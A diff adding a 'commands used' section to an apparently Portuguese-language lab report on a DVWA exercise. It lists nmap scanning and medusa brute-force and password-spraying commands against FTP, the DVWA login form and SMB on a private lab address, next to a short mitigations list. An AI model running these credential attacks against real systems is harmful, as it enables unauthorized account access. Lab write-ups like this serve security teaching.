@@ -76,6 +76,19 @@ Mitigacao
 • Monitoramento de logs
 • Bloqueio por IP
 
+Comandos utilizados
+
+nmap -sV 192.168.135.3
+
+medusa -h 192.168.135.3 -U users.txt -P pass.txt -M ftp
+
+medusa -h 192.168.135.3 -U users.txt -P pass.txt -M http
+-m PAGE:'/dvwa/login.php'
+-m FORM:'username=^USER^&password=^PASS^&Login=Login'
+-m 'FAIL=Login failed' -t 6
+
+medusa -h 192.168.135.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
 Conclusao
 
 O ambiente demonstrou como ataques simples funcionam.
